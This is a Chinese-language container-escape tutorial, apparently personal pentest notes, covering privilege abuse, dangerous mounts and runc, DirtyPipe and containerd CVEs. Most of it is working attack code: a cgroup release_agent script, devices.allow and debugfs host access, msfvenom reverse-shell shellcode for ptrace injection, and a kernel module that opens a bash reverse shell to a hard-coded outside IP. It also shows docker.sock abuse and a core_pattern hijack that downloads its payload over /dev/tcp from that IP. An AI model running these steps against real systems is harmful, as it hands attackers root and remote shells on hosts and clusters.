容器权限，是运行在宿主机上的一个受限制进程；容器逃逸，指的是从受限制进程获取未受限的完整权限的过程，即我们常说的“逃逸到宿主机”或者“获取宿主机权限”，本质上是提权。

# 容器Capabilities权限滥用
进入容器后的信息收集过程，会获取Capabilities信息，如果发现容器存在特殊的权限分配，则可利用进行容器逃逸。

## PRIVILEGED
在特权容器中，有多种方式进行逃逸，包括后边提到的SYS_ADMIN、SYS_PTRACE、SYS_MODULE的利用方式，都是兼容特权容器的。

### mount device
通过挂载磁盘设备的方式进行逃逸

```plain
#查看宿主机的磁盘设备，非特权账号没有权限查看，容器中可能不存在该命令
fdisk -l

#fdisk命令不存在时，也可以通过如下命令查看磁盘设备位置，非特权账号也可以使用
cat /proc/self/mountinfo | grep /etc
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665590758972-9b4fbccd-6511-4ae3-86c2-c728b4cc5b46.png)

```plain
#启动特权容器
docker run -it --privileged nginx /bin/bash

#寻找磁盘设备位置
cat /proc/self/mountinfo | grep /etc

#挂载device
mkdir /tmp/pocking_mount
mount /dev/vda1 /tmp/pocking_mount
```

成功读写宿主机任意文件的权限

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665591300724-ecfdd2fe-581d-4220-9443-990ad5ae76f6.png)

也可以使用cdk进行信息收集

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665591340195-1d184c2c-2106-41ab-a93b-2f84ce5e92d2.png)

并进行利用

```plain
./cdk run mount-disk
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665591365149-150f94e8-3ac9-4aec-8aab-0cc4374f1e08.png)

### 创建cgroup
创建memory cgroup 并且利用 release_agent 的方式进行逃逸

```plain
#创建特权容器
docker run --rm -it --privileged ubuntu /bin/bash
```

运行1-host-ps.sh逃逸到宿主机上执行命令

```plain
###1-host-ps.sh

#!/bin/bash
set -uex
#创建memory子系统的cgroup
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x


echo 1 > /tmp/cgrp/x/notify_on_release

#从 mount 信息中找出宿主机内对应当前容器内部文件结构的路径
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
 
echo '#!/bin/sh' > /cmd
echo "touch /tmp/success > $host_path/output" >> /cmd
chmod a+x /cmd
 
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"


cat "/output"
```

成功获取宿主机ps -ef内容，并打印

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665591946663-faa20960-36af-441f-995b-224104ecae1e.png)

## SYS_ADMIN
### 创建 cgroup
创建device cgroup，使用mknod 创建设备文件进行逃逸

```plain
#创建sys_admin权限容器
docker run --rm -it --cap-add=sys_admin ubuntu /bin/bash

#创建device子系统的cgroup
mkdir /tmp/dev
mount -t cgroup -o devices devices /tmp/dev/

#寻找当前容器cgroup的路径
cat /proc/self/mountinfo   | grep etc/
find /tmp/dev -name "devices.allow" | grep d5d77728bf05d32c6ac9f18d548ae92a3c04e8d0b01407dd9fa2678dc4f0b7dd

#修改当前已控容器 cgroup 的 devices.allow，此时容器内已经可以访问所有类型的设备
echo a >
/tmp/dev/docker/b76c0b53a9b8fb8478f680503164b37eb27c2805043fecabb450c48eaad10b57/devices.allow

#使用 mknod 创建相应的设备文件目录并使用 debugfs 进行访问
mknod near b 253 1
debugfs -w near
```

devices.allow未修改前，无法访问宿主机文件

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665592580226-eb94c235-e87f-438c-9992-af029ca114a6.png)

devices.allow修改后，成功读写宿主机任意文件的权限

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665592587475-78de3e0d-cb78-4ee4-bf76-26e8a2ae9867.png)

> 如果在privileged权限下，可以省略修改devices.allow的步骤，直接使用mknod 创建相应的设备文件目录
>
> 寻找寻找当前容器cgroup的路径，也可以直接执行命令
>
> cat /proc/1/cgroup
>
> ![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665643089539-fdd282a1-80f0-434f-825f-ac945f21170b.png)
>

## SYS_PTRACE
### 共享宿主机PID名称空间
当容器具有sys_ptrace权限，并且共享宿主机PID名称空间时，可以通过注入宿主机进程的方式进行逃逸。

在容器内，可以通过查看/proc/1/status的方式获取Capabilities信息，或者使用cdk工具

```plain
#创建不共享PID的docker容器
docker run --rm -it --cap-add=sys_ptrace ubuntu /bin/bash

./cdk run check-ptrace
在不共享宿主机PID namespace的情况下，只具备sys_ptrace权限时，只能列举容器的进程
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665593682593-0cb5414c-6256-4d07-902e-b26c11bdc28b.png)



```plain
#创建共享PID的docker容器，能列举宿主机进程
docker run --pid=host --rm -it --cap-add=sys_ptrace ubuntu /bin/bash
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665593336124-9fa8fbbf-0abd-497e-93e5-6cc663068366.png)

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665593799464-d816fed4-3bf2-402d-88c3-ac1ef3628b76.png)

在K8s集群环境中，也可创建相同条件的容器环境

```plain
#创建Pod容器
apiVersion: v1
kind: Pod
metadata:
  name: nginx-share
spec:
  hostPID: true  
  #shareProcessNamespace: true
  containers:
  - name: nginx-share
    image: nginx
    securityContext:
      capabilities:
        add:
        - SYS_PTRACE
    stdin: true
    tty: true

```

### 进程注入
存在sys_ptrace的容器可以进行进程注入，如果能注入到宿主机进程，则可以逃逸

```plain
#下载0x00sec_code项目
git clone https://github.com/0x00pf/0x00sec_code.git
修改/0x00sec_code/mem_injec/infect.c，为进程注入利用代码
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665593849352-15551f06-4a11-4c48-aa83-55f33cceb619.png)

```plain
注入的shellcode可以使用msfvenom生成

#反弹shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=x.x.x.x LPORT=4444 -f java

#执行命令
msfvenom -p linux/x64/exec CMD='touch /tmp/success2' -f java
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665593888720-73b212d0-f556-4dae-883f-4d4d4974b3d0.png)

<font style="color:rgb(51, 51, 51);background-color:rgb(251, 250, 248);">使用文本编辑器转换成shellcode格式</font>

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665593883868-5de60b5a-225b-4647-9cb1-b4ab2e1409d9.png)

编译infect.c生成可执行程序

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665594018386-a32ab12f-1215-4f4a-91e4-d050dd5546aa.png)

<font style="color:rgb(51, 51, 51);background-color:rgb(251, 250, 248);">这里在容器中查看PID，由于与宿主机共享PID namespace，可以查看到宿主机进程，选择PID 754进行注入 </font>

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665594047191-d4f19f6f-4846-4dfe-a462-a0d187fcf82c.png)

<font style="color:rgb(51, 51, 51);background-color:rgb(251, 250, 248);">在容器上执行</font>

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665594063501-dc1cb55e-e1ce-49e2-b38a-ccbc141c25b8.png)

<font style="color:rgb(51, 51, 51);background-color:rgb(251, 250, 248);">获取宿主机权限，成功逃逸</font>

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665594089207-a84e5d63-0f3f-4958-8c91-e2f152d5e979.png)

> 拥有privileged权限也可以利用此方式进行逃逸
>

## SYS_MODULE
具备该权限可以在容器中加载内核模块，宿主机与容器共享内核，加载内核模块执行命令可逃逸到宿主机

### 加载内核模块 
启动sys_module权限的容器

```plain
docker run --rm -it --cap-add=sys_module ubuntu /bin/bash
```

编译待加载的内核模块

```plain
#reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");


char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/1.117.69.136/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };


// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}


static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Exiting\n");
}


module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```plain
#Makefile
obj-m +=reverse-shell.o


all:
        make -C /usr/lib/modules/4.18.0-348.7.1.el8_5.x86_64/build M=$(PWD) modules


clean:
        make -C /usr/lib/modules/4.18.0-348.7.1.el8_5.x86_64/build M=$(PWD) clean
```

注意，上边的/usr/lib/modules/4.18.0-348.7.1.el8_5.x86_64/build为我宿主机内核版本对应的地址，不同待逃逸主机该地址不同，同时在编写Makefile时，红框位置为 tab 不是空格

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665595172734-4be425f0-8ca4-4317-85fb-e5ec1cf829b7.png)

编写好Makefile后，进行编译，reverse-shell.ko为我们需要在容器中注入的模块

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665595303157-b319397b-b43a-492c-a51d-11cdd3d3895c.png)

在容器上下载reverse-shell.ko，并执行如下命令，加载内核模块

```plain
apt-get update
apt-get install kmod
insmod reverse-shell.ko
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665595381921-695ed862-4c68-4c23-9180-e5ae6489ceec.png)

> 拥有privileged权限也可以利用此方式进行逃逸
>

除了上述特殊权限，更多特殊权限利用可参考[这里](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities)。

# 容器挂载不安全目录
## 挂载特殊路径
<font style="color:rgb(36, 41, 47);">这类的挂载很好理解，例如宿主机的内的 /, /etc/, /root/.ssh 等目录的写权限被挂载进容器时，在容器内部可以修改宿主机内的 /etc/crontab、/root/.ssh/、/root/.bashrc 等文件执行任意命令，就可以导致容器逃逸，不再赘述。</font>

## docker in docker
当宿主机的 /var/run/docker.sock 被挂载容器内的时候，容器内就可以通过 docker.sock 在宿主机里创建任意配置的容器，此时可以理解为可以创建任意权限的进程，当然也可以控制任意正在运行的容器。

<font style="color:rgb(36, 41, 47);">可以试试 Google Cloud IDE 天然自带的容器逃逸场景，拥有 Google 账号可以直接点击下面的链接获取容器环境和利用代码，直接执行利用代码 try_google_cloud/host_root.sh 再 chroot 到 /rootfs 你就可以获取一个完整的宿主机 shell：</font>

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665627939269-7424232a-0491-47fa-ad97-b687ce8db5e5.png)

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665627946632-ea11ad53-c847-4768-b1a7-d8717f1d05e5.png)

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665628211879-46f48019-572e-453c-9af9-156f42af17bc.png)

也可以在容器中使用如下命令<font style="color:rgb(36, 41, 47);">创建一个通往宿主机的 shell</font>

```plain
./bin/docker -H unix:///tmp/rootfs/var/run/docker.sock run -d -it --rm --name rshell -v "/proc:/host/proc" -v "/sys:/host/sys" -v "/:/rootfs" --network=host --privileged=true --cap-add=ALL alpine:latest
```

也可以使用cdk工具发包到docker

## 挂载/proc
在容器运行段错误的程序，触发恶意代码在Node节点上执行，造成逃逸。

```plain
#首先创建段错误程序
#include<stdio.h>
int main(void)
{
  int *a=NULL;
  *a = 1;
  return 0;
}

#编译
gcc main.c
nc -lvp 999 < a.out
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665639840759-5f71f37c-5cae-4eee-9eb0-7a500ce14527.png)



```plain
#创建挂载/proc的容器
docker run -v /proc:/host_proc --rm -it ubuntu bash

#在容器内写入逃逸到Node节点后待执行的命令
echo IyEvYmluL3NoCnRvdWNoIC90bXAvMzMzMzMzMzMzMzMzMzMzMzMzCg== | base64 -d > /exp.sh 
chmod 777 /exp.sh

#从mount信息中找出宿主机内对应当前容器内部文件结构的路径
sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab

#在core_pattern中写入恶意脚本位置（宿主机上exp.sh的位置），并隐藏真实路径
echo -e "|/var/lib/docker/overlay2/9f0cd3cab90b5180a87a9cef5dc15e899dd0e132b28f65d13f423f2145500a4e/diff/exp.sh \rcore" > /host_proc/sys/kernel/core_pattern

#a.out为触发段错误的程序
cat < /dev/tcp/1.117.69.136/999 > a.out
chmod 777 a.out
./a.out
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665640538937-dd759083-e4ef-4546-8654-39a8cfb8c75c.png)

> 坑点：
>
> ![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665640587911-451b315e-7306-42c9-b329-692a1bf363d1.png)
>
> 执行段错误程序，输出core表示exp.sh正常运行，不带core表示exp.sh语法有错误，被坑了很久，原来BurpSuite中是以\x0a\x0d为换行符 ，Linux中bash脚本需要以\x0a为换行，导致在BurpSuite中编写的bash脚本无法在Linux上正常运行
>
> ![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665640885921-fb29d1b7-3de7-452e-a4a2-8f15d2ab9972.png)
>
> ![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665640891876-6bcadcf5-13fd-40c0-b392-2231e5c78dcf.png)
>
> 可以在Linux终端编写bash脚本，再base64编码 
>

## 攻击 lxcfs
<font style="color:rgb(36, 41, 47);">lxcfs： </font>[https://linuxcontainers.org/lxcfs/](https://linuxcontainers.org/lxcfs/)

当使用lxcfs修改<font style="color:rgb(36, 41, 47);">目录权限时，</font>会绑定当前容器的<font style="color:rgb(36, 41, 47);">devices subsystem cgroup到容器的对应目录中，与利用SYS_ADMIN权限进行提权一样，通过</font>修改当前已控容器 cgroup 的 devices.allow，可以使用 mknod 创建相应的设备文件目录并使用 debugfs 进行访问，获取读写宿主机任意文件的权限。

```plain
#在Master节点上创建Pod
apiVersion: v1
kind: Pod
metadata:
  name: lxcfs-rw
spec:
  containers:
  - name: lxcfs-rw-5
    image: nginx
    command: ["sleep"]
    args: ["infinity"]
    imagePullPolicy: IfNotPresent
    volumeMounts:
    - name: test-data
      mountPath: /data
      mountPropagation: HostToContainer
  volumes:
  - name: test-data
    hostPath:
      path: /data
      type: ""
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665642310384-85b25486-6ff2-4536-a33d-27c3dcfca003.png)

```plain
#在Node工作节点上安装lxcfs
dnf -y install lxcfs

#修改/data/test/lxcfs权限
lxcfs /data/test/lxcfs
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665642335984-50d32d28-3747-425c-8753-9e8453e94f57.png)

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665642394652-b0f40a1c-d324-4846-9ec3-945cd62828da.png)

```plain
kubectl exec -n default lxcfs-rw -it bash
cat /proc/self/mountinfo | grep etc/
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665642451308-767092df-d56d-4683-9cf4-8463f4335078.png)

```plain
find /data/test/lxcfs/ -name "devices.allow"

echo a > /data/test/lxcfs/cgroup/devices/kubepods.slice/kubepods-besteffort.slice/kubepods-besteffort-podb967720b_f760_41b4_b4b2_ec54569de823.slice/docker-cdc202275e7e935789738360225638bd797a0dd486b2d475babade4231b9e336.scope/devices.allow

mknod near b 253 1
debugfs -w near
```

成功获取宿主机读写文件权限

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665642707299-867943f7-d35b-4c9b-a96d-60129b12e437.png)

```plain
使用cdk工具利用
./cdk run lxcfs-rw
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665642763847-a71dd0e8-0975-4516-8dc4-375d43298975.png)

# <font style="color:rgb(36, 41, 47);">容器相关组件漏洞</font>
## runc CVE-2019-5736
<font style="color:rgb(36, 41, 47);">通过重写RUNC二进制文件的方式，逃逸到宿主机以root用户执行命令，这个由 RUNC 实现而导致的逃逸漏洞太出名了，出名到每一次提及容器安全能力或容器安全研究都会被拿出来当做案例或 DEMO。但不得不说，这里的利用条件在实际的攻防场景里还是过于有限了；实际利用还是需要一些特定的场景才能真的想要去使用和利用它。</font>

> <font style="color:rgb(36, 41, 47);">实战中 EXP 需要钓鱼让管理员去执行 docker exec 或 kubectl exec 才可以触发；也存在一些无交互即可触发的场景，主要是在企业内网中 vscode server、jupyter notebook、container webconsole 等这种提供容器内交互式 shell 的多租户场景。</font>
>
> 漏洞的版本是在docker version <=18.09.2，runc version<=1.0-rc6。
>
> <font style="color:rgb(36, 41, 47);"></font>
>

<font style="color:rgb(36, 41, 47);">这里公开的 POC 很多，不同的环境和操作系统发行版本利用起来有一定的差异，可以参考进行利用：</font>

1. <font style="color:rgb(36, 41, 47);">github.com/feexd/pocs</font>
2. <font style="color:rgb(36, 41, 47);">github.com/twistlock/RunC-CVE-2019-5736</font>
3. <font style="color:rgb(36, 41, 47);">github.com/AbsoZed/DockerPwn.py</font>
4. <font style="color:rgb(36, 41, 47);">github.com/q3k/cve-2019-5736-poc</font>
5. [<font style="color:rgb(36, 41, 47);">github.com/Frichetten/CVE-2019-5736-PoC</font>](https://github.com/Frichetten/CVE-2019-5736-PoC)



本地docker版本

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665653923731-31359b08-9659-4446-81d9-5231083ceabf.png)



编译EXP，这里使用[https://github.com/Frichetten/CVE-2019-5736-PoC](https://github.com/Frichetten/CVE-2019-5736-PoC) 在本地编译

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665656011205-47670b80-17c0-4af8-9111-ff11c99895d5.png)

上传到容器中

```plain
#在宿主机执行exp
./main -shell "touch /tmp/22222222222"

#覆盖/bin/sh后，等待受害者进入容器后，会获取PID，然后进行利用，由于本地搭建的环境没有runc进程，没有利用成功
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665656264115-1ee283a1-2c17-4c12-bf0f-1ad62ad46272.png)

下边截图为理想情况

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665656454955-49a9c87e-742f-4232-820a-b6fa3887f5c0.png)

使用cdk攻击也一样，没有runc进程，攻击失败

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665655793742-71d23b32-09b4-4df6-a452-04f8074145a6.png)

## DityPipe（<font style="color:rgb(34, 34, 34);">CVE-2022-0847） 覆盖Runc</font>
<font style="color:rgb(36, 41, 47);">漏洞点是在 splice 系统调用中未清空 pipe_buffer 的标志位，从而将管道页面可写入的状态保留了下来，这给了我们越权写入只读文件的操作。</font>

<font style="color:rgb(36, 41, 47);">攻击者利用该漏洞可以覆盖任意只读文件中的数据，这样将普通的权限提升至root权限。</font>

> <font style="color:rgb(85, 85, 85);">影响版本：</font>
>
> <font style="color:rgb(85, 85, 85);">Linux Kernel版本 >= 5.8</font>
>
> <font style="color:rgb(85, 85, 85);">Linux Kernel版本 < 5.16.11 / 5.15.25 / 5.10.102</font>
>

```plain
#为了复现，使用metarget安装指定内核，并重新启动
git clone https://github.com/brant-ruan/metarget.git 
cd metarget/pip3 install -r requirements.txt
./metarget gadget install kernel --version 5.11.0
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1666803294743-fd76e10e-3765-4675-8db4-46564646a1d0.png)

```plain
#test文件为exp，启动docker进入容器中，运行exp反弹shell至宿主机4444端口
docker run -it -v /tmp/test:/tmp/test e0eacd3ee3ed /bin/bash
./test -ip 127.0.0.1 -port 4444
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1666803360998-f5616758-5f6f-49d4-a0aa-47b9d312fd43.png)

```plain
#执行docker exec，再次进入当前容器
docker exec -it 717 /bin/bash
```

## ![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1666803395961-733efdad-dce3-4112-a318-c08e8b499dee.png)
```plain
触发payload执行
```

## ![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1666803420948-b3f569ec-d905-4678-914f-76c775df6022.png)
逃逸成功，获取宿主机权限

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1666803438867-63ff2ca8-2434-4620-b80a-76e8bdeafe05.png)

## 
## containerd CVE-2020-15257
<font style="color:rgb(36, 41, 47);">当容器和宿主机共享一个 net namespace 时（如使用 --net=host 或者 Kubernetes 设置 pod container 的 .spec.hostNetwork 为 true）攻击者可对拥有特权的 containerd shim API 进行操作，可能导致容器逃逸获取主机权限、修改主机文件等危害</font>

> 容器使用root用户(即UID 0); 
>
> containerd版本在 <=1.3.7 
>



```plain
#为了复现，卸载本地containerd，并安装存在漏洞的版本
apt remove containerd
apt install containerd.io=1.3.7-1
```



```plain
#确认是否存在漏洞,如果有返回结果，则说明存在
cat /proc/net/unix | grep 'containerd-shim' | grep '@'
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665998744486-d94851a9-3be6-4224-82f2-bcac7b24f7d1.png)

使用cdk进行攻击

```plain
./cdk_linux_amd64_upx run shim-pwn "touch /tmp/22222222"
```

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665998889147-baf156d1-6a4b-4509-81f1-a95f5b45a65a.png)

成功在宿主机上写入文件

![](https://cdn.nlark.com/yuque/0/2022/png/12767265/1665998893710-9bb43dfc-8528-48e9-965d-4275a1aef492.png)



# <font style="color:rgb(36, 41, 47);">内核漏洞</font>
这里将内核提权漏洞用于容器提权的场景，是因为容器与宿主机共享内核，在容器中使用内核漏洞可提权获取宿主机权限，从而逃逸出容器。

